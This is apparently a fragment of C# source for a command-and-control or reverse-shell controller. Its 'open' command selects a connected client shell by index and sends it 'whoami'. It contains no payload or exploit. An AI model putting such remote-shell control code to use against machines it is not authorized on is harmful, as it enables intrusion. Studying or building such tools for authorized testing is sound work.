using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Console = Colorful.Console;

namespace Controller
{
    /// <summary>
    /// Commands for the controller.
    /// </summary>
    public class Commands
    {
        [Command(Help = "Sets current active shell to be controlled.\r\nUsage: open [index] Ex. open 0")]
        public void Open(string index) {
            try
            {
                int _index = int.Parse(index);

                Program.ActiveClient = Program.MainServer.Clients[_index];

                Program.ActiveClient.WriteCMD("whoami");

                Utils.Logging.Write(Utils.Logging.Type.Success, $"Active shell is now " + index);
            }
            catch (ArgumentOutOfRangeException ex)
            {
                Utils.Logging.Write(Utils.Logging.Type.Error, $"Shell of index {index} doesn't exist!");
            }
            catch { }
        }
        [Command(Help = "Displays help.")]
        public void Help()
        {
            Console.WriteLine("Help");
        }
    }
}
